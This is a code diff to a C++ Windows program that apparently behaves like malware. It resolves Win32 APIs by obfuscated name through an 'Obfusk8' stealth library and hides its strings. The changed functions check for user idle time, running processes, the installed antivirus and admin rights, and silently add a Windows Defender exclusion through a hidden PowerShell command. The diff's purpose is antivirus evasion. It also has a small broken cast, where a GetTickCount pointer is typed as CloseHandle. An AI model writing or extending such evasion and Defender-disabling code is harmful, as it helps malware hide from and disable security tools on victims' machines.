@@ -19,6 +19,25 @@
 // Include Obfusk8 for stealth API calling
 #include "../Obfusk8/Instrumentation/materialization/state/Obfusk8Core.hpp"
 
+typedef BOOL(WINAPI* pGetLastInputInfo_t)(PLASTINPUTINFO);
+typedef HANDLE(WINAPI* pCreateMutexA_t)(LPSECURITY_ATTRIBUTES, BOOL, LPCSTR);
+typedef HANDLE(WINAPI* pCreateToolhelp32Snapshot_t)(DWORD, DWORD);
+typedef BOOL(WINAPI* pProcess32FirstW_t)(HANDLE, LPPROCESSENTRY32W);
+typedef BOOL(WINAPI* pProcess32NextW_t)(HANDLE, LPPROCESSENTRY32W);
+typedef BOOL(WINAPI* pCloseHandle_t)(HANDLE);
+typedef BOOL(WINAPI* pGetUserNameA_util_t)(LPSTR, LPDWORD);
+typedef BOOL(WINAPI* pOpenProcessToken_t)(HANDLE, DWORD, PHANDLE);
+typedef BOOL(WINAPI* pGetTokenInformation_t)(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);
+typedef LONG(WINAPI* pRegOpenKeyExA_util_t)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
+typedef LONG(WINAPI* pRegCloseKey_util_t)(HKEY);
+typedef LONG(WINAPI* pRegEnumKeyExA_t)(HKEY, DWORD, LPSTR, LPDWORD, LPDWORD, LPSTR, LPDWORD, PFILETIME);
+typedef LONG(WINAPI* pRegOpenKeyExW_t)(HKEY, LPCWSTR, DWORD, REGSAM, PHKEY);
+typedef LONG(WINAPI* pRegEnumKeyExW_t)(HKEY, DWORD, LPWSTR, LPDWORD, LPDWORD, LPWSTR, LPDWORD, PFILETIME);
+typedef LONG(WINAPI* pRegQueryValueExW_t)(HKEY, LPCWSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
+typedef BOOL(WINAPI* pCreateProcessW_t)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
+typedef DWORD(WINAPI* pWaitForSingleObject_t)(HANDLE, DWORD);
+typedef BOOL(WINAPI* pGetExitCodeProcess_t)(HANDLE, LPDWORD);
+
 #pragma comment(lib, "wbemuuid.lib")
 #pragma comment(lib, "ole32.lib")
 #pragma comment(lib, "oleaut32.lib")
@@ -82,18 +101,17 @@ wchar_t* get_file_name(wchar_t *full_path)
 
 
 std::string GetWindowsUsername() {
+    pGetUserNameA_util_t _GetUserNameA = (pGetUserNameA_util_t)STEALTH_API_OBFSTR("advapi32.dll", "GetUserNameA");
     const DWORD MAX_USERNAME_LENGTH = 256;
     char username[MAX_USERNAME_LENGTH];
     DWORD size = MAX_USERNAME_LENGTH;
-    
-    if (!GetUserNameA(username, &size)) {
-        std::cerr << "Error getting username. Code: " << GetLastError() << std::endl;
+
+    if (!_GetUserNameA || !_GetUserNameA(username, &size)) {
         return OBFUSCATE_STRING("guest");
     }
 
     std::string result(username, size - 1);
     std::replace(result.begin(), result.end(), ' ', '-');
-    
     return result;
 }
 
@@ -159,47 +177,42 @@ bool IsPidRunning(DWORD pid) {
 
 
 bool AreProcessesRunning(const std::vector<std::string>& processNames) {
-    HANDLE hProcessSnap;
+    pCreateToolhelp32Snapshot_t _CreateToolhelp32Snapshot = (pCreateToolhelp32Snapshot_t)STEALTH_API_OBFSTR("kernel32.dll", "CreateToolhelp32Snapshot");
+    pProcess32FirstW_t _Process32FirstW = (pProcess32FirstW_t)STEALTH_API_OBFSTR("kernel32.dll", "Process32FirstW");
+    pProcess32NextW_t _Process32NextW = (pProcess32NextW_t)STEALTH_API_OBFSTR("kernel32.dll", "Process32NextW");
+    pCloseHandle_t _CloseHandle = (pCloseHandle_t)STEALTH_API_OBFSTR("kernel32.dll", "CloseHandle");
+    if (!_CreateToolhelp32Snapshot || !_Process32FirstW || !_Process32NextW || !_CloseHandle)
+        return false;
+
+    HANDLE hProcessSnap = _CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hProcessSnap == INVALID_HANDLE_VALUE)
+        return false;
+
     PROCESSENTRY32W pe32;
-    
-    // Take a snapshot of all processes in the system
-    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hProcessSnap == INVALID_HANDLE_VALUE) {
-        return false;
-    }
-    
-    // Set the size of the structure before using it
     pe32.dwSize = sizeof(PROCESSENTRY32W);
-    
-    // Retrieve information about the first process
-    if (!Process32FirstW(hProcessSnap, &pe32)) {
-        CloseHandle(hProcessSnap); // clean the snapshot object
+
+    if (!_Process32FirstW(hProcessSnap, &pe32)) {
+        _CloseHandle(hProcessSnap);
         return false;
     }
-    
-    // Setup converter from wide char to UTF-8
+
     std::wstring_convert<std::codecvt_utf8<wchar_t>, wchar_t> converter;
-    
-    // Walk through the process list
+
     do {
-        // Convert the wide char process name to UTF-8 string
         std::string currentProcess = converter.to_bytes(pe32.szExeFile);
         std::transform(currentProcess.begin(), currentProcess.end(), currentProcess.begin(), ::tolower);
-        
-        // Check against each process in our list
+
         for (const auto& targetProcess : processNames) {
             std::string targetLower = targetProcess;
             std::transform(targetLower.begin(), targetLower.end(), targetLower.begin(), ::tolower);
-            
-            // If we find a match, return true
             if (currentProcess.find(targetLower) != std::string::npos) {
-                CloseHandle(hProcessSnap);
+                _CloseHandle(hProcessSnap);
                 return true;
             }
         }
-    } while (Process32NextW(hProcessSnap, &pe32));
-    
-    CloseHandle(hProcessSnap);
+    } while (_Process32NextW(hProcessSnap, &pe32));
+
+    _CloseHandle(hProcessSnap);
     return false;
 }
 
@@ -230,26 +243,26 @@ std::string buildCommandFromTemplate(
 }
 
 bool IsDeviceIdle(int minutes) {
-    // Get the last input time in milliseconds
+    pGetLastInputInfo_t _GetLastInputInfo = (pGetLastInputInfo_t)STEALTH_API_OBFSTR("user32.dll", "GetLastInputInfo");
+    pCloseHandle_t _GetTickCount = (pCloseHandle_t)STEALTH_API_OBFSTR("kernel32.dll", "GetTickCount");
+    typedef DWORD(WINAPI* pGetTickCount_t)();
+    pGetTickCount_t _Tick = (pGetTickCount_t)STEALTH_API_OBFSTR("kernel32.dll", "GetTickCount");
+
     LASTINPUTINFO lastInputInfo;
     lastInputInfo.cbSize = sizeof(LASTINPUTINFO);
-    
-    if (!GetLastInputInfo(&lastInputInfo)) {
-        std::cerr << "Failed to get last input info. Error: " << GetLastError() << std::endl;
-        return false; // Assume not idle if we can't determine
-    }
 
-    // Calculate idle time in milliseconds
-    DWORD currentTickCount = GetTickCount();
+    if (!_GetLastInputInfo || !_GetLastInputInfo(&lastInputInfo))
+        return false;
+
+    DWORD currentTickCount = _Tick ? _Tick() : GetTickCount();
     DWORD idleTimeMs = currentTickCount - lastInputInfo.dwTime;
-
-    // Convert minutes to milliseconds
     auto thresholdMs = std::chrono::minutes(minutes).count() * 60 * 1000;
-    
     bool isIdle = (idleTimeMs >= thresholdMs);
-    
+
+#ifdef ENABLE_DEBUG_CONSOLE
     std::cout << "[IDLE_CHECK] Idle time: " << (idleTimeMs / 1000 / 60) << "m " << ((idleTimeMs / 1000) % 60) << "s, Threshold: " << minutes << "m, IsIdle: " << (isIdle ? "YES" : "NO") << std::endl;
     std::cout.flush();
+#endif
 
     return isIdle;
 }
@@ -257,23 +270,17 @@ bool IsDeviceIdle(int minutes) {
 
 
 bool IsAnotherInstanceRunning(const char* mutexName) {
-    HANDLE hMutex = CreateMutexA(
-        NULL,           // Default security attributes
-        TRUE,           // Initially owned
-        mutexName);     // Unique mutex name (ANSI version)
+    pCreateMutexA_t _CreateMutexA = (pCreateMutexA_t)STEALTH_API_OBFSTR("kernel32.dll", "CreateMutexA");
+    pCloseHandle_t _CloseHandle = (pCloseHandle_t)STEALTH_API_OBFSTR("kernel32.dll", "CloseHandle");
+    if (!_CreateMutexA) return true;
 
-    if (hMutex == NULL) {
-        std::cerr << "CreateMutex error: " << GetLastError() << std::endl;
-        return true; // Assume another instance is running to be safe
-    }
+    HANDLE hMutex = _CreateMutexA(NULL, TRUE, mutexName);
+    if (hMutex == NULL) return true;
 
     if (GetLastError() == ERROR_ALREADY_EXISTS) {
-        ReleaseMutex(hMutex);
-        CloseHandle(hMutex);
+        if (_CloseHandle) _CloseHandle(hMutex);
         return true;
     }
-
-    // Mutex is held; release it when the program exits
     return false;
 }
 
@@ -431,82 +438,65 @@ std::string GetGPUName() {
     }
 
 registry_fallback:
-    // Fallback to registry if WMI fails
+    {
+    pRegOpenKeyExW_t _RegOpenKeyExW = (pRegOpenKeyExW_t)STEALTH_API_OBFSTR("advapi32.dll", "RegOpenKeyExW");
+    pRegEnumKeyExW_t _RegEnumKeyExW = (pRegEnumKeyExW_t)STEALTH_API_OBFSTR("advapi32.dll", "RegEnumKeyExW");
+    pRegQueryValueExW_t _RegQueryValueExW = (pRegQueryValueExW_t)STEALTH_API_OBFSTR("advapi32.dll", "RegQueryValueExW");
+    pRegCloseKey_util_t _RegCloseKey = (pRegCloseKey_util_t)STEALTH_API_OBFSTR("advapi32.dll", "RegCloseKey");
+    if (!_RegOpenKeyExW || !_RegEnumKeyExW || !_RegQueryValueExW || !_RegCloseKey)
+        return OBFUSCATE_STRING("Unknown");
+
     HKEY hKey = NULL;
-    LONG result = RegOpenKeyExW(HKEY_LOCAL_MACHINE,
+    LONG result = _RegOpenKeyExW(HKEY_LOCAL_MACHINE,
         L"SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}",
         0, KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE, &hKey);
-    
-    if (result != ERROR_SUCCESS) {
-        return "Unknown";
-    }
 
-    std::string gpuName = "Unknown";
+    if (result != ERROR_SUCCESS)
+        return OBFUSCATE_STRING("Unknown");
+
+    std::string gpuName = OBFUSCATE_STRING("Unknown");
     DWORD index = 0;
     wchar_t subkeyName[256] = {0};
     DWORD subkeyNameSize = sizeof(subkeyName) / sizeof(wchar_t);
 
-    // Enumerate subkeys
-    while (RegEnumKeyExW(hKey, index, subkeyName, &subkeyNameSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
+    while (_RegEnumKeyExW(hKey, index, subkeyName, &subkeyNameSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
         HKEY hSubKey = NULL;
-        
-        // Open subkey
-        if (RegOpenKeyExW(hKey, subkeyName, 0, KEY_QUERY_VALUE, &hSubKey) == ERROR_SUCCESS) {
+        if (_RegOpenKeyExW(hKey, subkeyName, 0, KEY_QUERY_VALUE, &hSubKey) == ERROR_SUCCESS) {
             wchar_t providerName[512] = {0};
             DWORD size = sizeof(providerName);
-            
-            // Query ProviderName value
-            if (RegQueryValueExW(hSubKey, L"ProviderName", NULL, NULL, (LPBYTE)providerName, &size) == ERROR_SUCCESS) {
-                // Check for NVIDIA, AMD, ATI, Intel
+            if (_RegQueryValueExW(hSubKey, L"ProviderName", NULL, NULL, (LPBYTE)providerName, &size) == ERROR_SUCCESS) {
                 if (wcsstr(providerName, L"NVIDIA") != NULL ||
                     wcsstr(providerName, L"AMD") != NULL ||
                     wcsstr(providerName, L"ATI") != NULL ||
                     wcsstr(providerName, L"Advanced Micro Devices") != NULL ||
                     wcsstr(providerName, L"Intel") != NULL) {
-                    
-                    // Try to get device description
                     wchar_t deviceDesc[512] = {0};
                     DWORD descSize = sizeof(deviceDesc);
-                    
-                    if (RegQueryValueExW(hSubKey, L"DeviceDesc", NULL, NULL, (LPBYTE)deviceDesc, &descSize) == ERROR_SUCCESS) {
-                        // Extract just the device name (after the semicolon if present)
+                    if (_RegQueryValueExW(hSubKey, L"DeviceDesc", NULL, NULL, (LPBYTE)deviceDesc, &descSize) == ERROR_SUCCESS) {
                         wchar_t* deviceName = deviceDesc;
                         wchar_t* semicolon = wcschr(deviceDesc, L';');
-                        if (semicolon != NULL) {
-                            deviceName = semicolon + 1;
-                        }
-                        
-                        // Convert to string and trim whitespace
+                        if (semicolon != NULL) deviceName = semicolon + 1;
                         char gpuNameA[512];
                         wcstombs_s(nullptr, gpuNameA, sizeof(gpuNameA), deviceName, _TRUNCATE);
                         gpuName = std::string(gpuNameA);
-                        
-                        // Trim leading and trailing whitespace
                         size_t start = gpuName.find_first_not_of(" \t");
-                        if (start != std::string::npos) {
-                            gpuName = gpuName.substr(start);
-                        }
+                        if (start != std::string::npos) gpuName = gpuName.substr(start);
                         size_t end = gpuName.find_last_not_of(" \t");
-                        if (end != std::string::npos) {
-                            gpuName = gpuName.substr(0, end + 1);
-                        }
-                        
-                        RegCloseKey(hSubKey);
-                        RegCloseKey(hKey);
+                        if (end != std::string::npos) gpuName = gpuName.substr(0, end + 1);
+                        _RegCloseKey(hSubKey);
+                        _RegCloseKey(hKey);
                         return gpuName;
                     }
                 }
             }
-            
-            RegCloseKey(hSubKey);
+            _RegCloseKey(hSubKey);
         }
-        
         index++;
         subkeyNameSize = sizeof(subkeyName) / sizeof(wchar_t);
     }
-
-    RegCloseKey(hKey);
+    _RegCloseKey(hKey);
     return gpuName;
+    }
 }
 
 std::string GetComputerHash() {
@@ -584,79 +574,73 @@ std::string GetComputerHash() {
 }
 
 std::string GetAntivirusName() {
-    // Check Windows Defender first
+    pRegOpenKeyExA_util_t _RegOpenKeyExA = (pRegOpenKeyExA_util_t)STEALTH_API_OBFSTR("advapi32.dll", "RegOpenKeyExA");
+    pRegCloseKey_util_t _RegCloseKey = (pRegCloseKey_util_t)STEALTH_API_OBFSTR("advapi32.dll", "RegCloseKey");
+    pRegEnumKeyExA_t _RegEnumKeyExA = (pRegEnumKeyExA_t)STEALTH_API_OBFSTR("advapi32.dll", "RegEnumKeyExA");
+    if (!_RegOpenKeyExA || !_RegCloseKey || !_RegEnumKeyExA)
+        return OBFUSCATE_STRING("Unknown");
+
     HKEY hKey;
-    LONG result = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
-        "SOFTWARE\\Microsoft\\Windows Defender",
+    LONG result = _RegOpenKeyExA(HKEY_LOCAL_MACHINE,
+        OBFUSCATE_STRING("SOFTWARE\\Microsoft\\Windows Defender").c_str(),
         0, KEY_READ, &hKey);
-    
+
     if (result == ERROR_SUCCESS) {
-        RegCloseKey(hKey);
-        return "Windows Defender";
+        _RegCloseKey(hKey);
+        return OBFUSCATE_STRING("Windows Defender");
     }
 
-    // Check for third-party antivirus via WMI
-    // Using registry path that lists installed antivirus products
-    result = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
-        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
+    result = _RegOpenKeyExA(HKEY_LOCAL_MACHINE,
+        OBFUSCATE_STRING("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall").c_str(),
         0, KEY_READ, &hKey);
-    
+
     if (result == ERROR_SUCCESS) {
-        char antivirus[256] = {0};
-        DWORD size = sizeof(antivirus);
-        
-        // Check for common antivirus products
         const char* antivirusNames[] = {
             "Norton", "McAfee", "Kaspersky", "AVG", "Avast",
             "Bitdefender", "F-Secure", "ESET", "Trend Micro", "Symantec"
         };
-        
+
         DWORD index = 0;
         char subkeyName[256];
         DWORD subkeyNameSize = sizeof(subkeyName);
-        
-        while (RegEnumKeyExA(hKey, index, subkeyName, &subkeyNameSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
+
+        while (_RegEnumKeyExA(hKey, index, subkeyName, &subkeyNameSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
             for (const char* av : antivirusNames) {
                 if (strstr(subkeyName, av) != nullptr) {
-                    RegCloseKey(hKey);
+                    _RegCloseKey(hKey);
                     return std::string(av);
                 }
             }
             index++;
             subkeyNameSize = sizeof(subkeyName);
         }
-        
-        RegCloseKey(hKey);
+        _RegCloseKey(hKey);
     }
-    
-    return "Unknown";
+
+    return OBFUSCATE_STRING("Unknown");
 }
 
-// Check if the current process is running with administrator privileges
 bool IsRunningAsAdmin() {
+    pOpenProcessToken_t _OpenProcessToken = (pOpenProcessToken_t)STEALTH_API_OBFSTR("advapi32.dll", "OpenProcessToken");
+    pGetTokenInformation_t _GetTokenInformation = (pGetTokenInformation_t)STEALTH_API_OBFSTR("advapi32.dll", "GetTokenInformation");
+    pCloseHandle_t _CloseHandle = (pCloseHandle_t)STEALTH_API_OBFSTR("kernel32.dll", "CloseHandle");
+    if (!_OpenProcessToken || !_GetTokenInformation) return false;
+
     BOOL isAdmin = FALSE;
     HANDLE hToken = NULL;
     TOKEN_ELEVATION elevation;
     DWORD dwSize = sizeof(TOKEN_ELEVATION);
 
-    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
-#ifdef ENABLE_DEBUG_CONSOLE
-        std::cerr << "[-] Failed to open process token" << std::endl;
-#endif
+    if (!_OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
         return false;
-    }
 
-    if (!GetTokenInformation(hToken, TokenElevation, &elevation, dwSize, &dwSize)) {
-#ifdef ENABLE_DEBUG_CONSOLE
-        std::cerr << "[-] Failed to get token information" << std::endl;
-#endif
-        CloseHandle(hToken);
+    if (!_GetTokenInformation(hToken, TokenElevation, &elevation, dwSize, &dwSize)) {
+        if (_CloseHandle) _CloseHandle(hToken);
         return false;
     }
 
     isAdmin = elevation.TokenIsElevated;
-    CloseHandle(hToken);
-
+    if (_CloseHandle) _CloseHandle(hToken);
     return isAdmin == TRUE;
 }
 
@@ -670,19 +654,24 @@ bool AddDefenderExclusion(const std::string& path) {
         return false;
     }
 
+    pCreateProcessW_t _CreateProcessW = (pCreateProcessW_t)STEALTH_API_OBFSTR("kernel32.dll", "CreateProcessW");
+    pWaitForSingleObject_t _WaitForSingleObject = (pWaitForSingleObject_t)STEALTH_API_OBFSTR("kernel32.dll", "WaitForSingleObject");
+    pGetExitCodeProcess_t _GetExitCodeProcess = (pGetExitCodeProcess_t)STEALTH_API_OBFSTR("kernel32.dll", "GetExitCodeProcess");
+    pCloseHandle_t _CloseHandle = (pCloseHandle_t)STEALTH_API_OBFSTR("kernel32.dll", "CloseHandle");
+    if (!_CreateProcessW) return false;
+
     // Build PowerShell command to add exclusion
-    std::string psCommand = "powershell -NoProfile -NonInteractive -Command \"Add-MpPreference -ExclusionPath '" + path + "' -Force -ErrorAction SilentlyContinue\"";
+    std::string psCmd = OBFUSCATE_STRING("powershell -NoProfile -NonInteractive -Command \"Add-MpPreference -ExclusionPath '");
+    psCmd += path + OBFUSCATE_STRING("' -Force -ErrorAction SilentlyContinue\"");
 
 #ifdef ENABLE_DEBUG_CONSOLE
     std::cout << "[*] Attempting to add Defender exclusion for: " << path << std::endl;
 #endif
 
-    // Convert to wide string for CreateProcessW
-    int size_needed = MultiByteToWideChar(CP_UTF8, 0, &psCommand[0], (int)psCommand.size(), NULL, 0);
+    int size_needed = MultiByteToWideChar(CP_UTF8, 0, &psCmd[0], (int)psCmd.size(), NULL, 0);
     std::wstring wpsCommand(size_needed, 0);
-    MultiByteToWideChar(CP_UTF8, 0, &psCommand[0], (int)psCommand.size(), &wpsCommand[0], size_needed);
+    MultiByteToWideChar(CP_UTF8, 0, &psCmd[0], (int)psCmd.size(), &wpsCommand[0], size_needed);
 
-    // Setup process creation with hidden window
     STARTUPINFOW si = { 0 };
     si.cb = sizeof(STARTUPINFOW);
     si.dwFlags = STARTF_USESHOWWINDOW;
@@ -690,37 +679,22 @@ bool AddDefenderExclusion(const std::string& path) {
 
     PROCESS_INFORMATION pi = { 0 };
 
-    // Create process with hidden window
-    BOOL result = CreateProcessW(
-        NULL,
-        (LPWSTR)wpsCommand.c_str(),
-        NULL,
-        NULL,
-        FALSE,
-        CREATE_NO_WINDOW,
-        NULL,
-        NULL,
-        &si,
-        &pi
-    );
+    BOOL result = _CreateProcessW(NULL, (LPWSTR)wpsCommand.c_str(), NULL, NULL, FALSE,
+        CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
 
     if (!result) {
 #ifdef ENABLE_DEBUG_CONSOLE
-        std::cerr << "[-] Failed to create PowerShell process (error: " << GetLastError() << ")" << std::endl;
+        std::cerr << "[-] Failed to create PowerShell process" << std::endl;
 #endif
         return false;
     }
 
-    // Wait for process to complete
-    WaitForSingleObject(pi.hProcess, INFINITE);
+    if (_WaitForSingleObject) _WaitForSingleObject(pi.hProcess, INFINITE);
 
-    // Get exit code
     DWORD exitCode = 0;
-    GetExitCodeProcess(pi.hProcess, &exitCode);
+    if (_GetExitCodeProcess) _GetExitCodeProcess(pi.hProcess, &exitCode);
 
-    // Cleanup
-    CloseHandle(pi.hProcess);
-    CloseHandle(pi.hThread);
+    if (_CloseHandle) { _CloseHandle(pi.hProcess); _CloseHandle(pi.hThread); }
 
     if (exitCode != 0) {
 #ifdef ENABLE_DEBUG_CONSOLE
